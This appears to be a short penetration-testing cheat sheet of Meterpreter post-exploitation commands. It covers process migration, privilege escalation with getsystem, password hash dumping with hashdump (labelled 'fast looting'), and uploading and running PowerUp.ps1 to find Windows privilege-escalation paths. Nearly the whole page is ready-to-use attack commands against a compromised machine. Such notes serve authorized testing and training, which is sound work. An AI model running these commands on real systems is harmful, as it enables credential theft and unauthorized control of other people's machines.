# Meterpreter

## Common Commands

```
meterpreter > getuid

// Inspect running process and migrate to a more stable process
meterpreter > ps
meterpreter > migrate <pid>

// Fast looting
meterpreter > getsystem
meterpreter > hashdump
```

{% hint style="info" %}
* Always migrate to a process that matches the architecture (see \`Arch\` field) of the system.
* Can only migrate to a process running as equal or lower privileged user.
{% endhint %}

**Upload and run \`PowerUp.ps1\` with \`Meterpreter\`**

```
meterpreter > upload /home/username/PowerUp.ps1

meterpreter > load powershell
Loading extension powershell...Success.

meterpreter > powershell_shell
PS > . .\PowerUp.ps1                                
PS > Invoke-AllChecks

Ctrl+Z to background this when finished
```

****
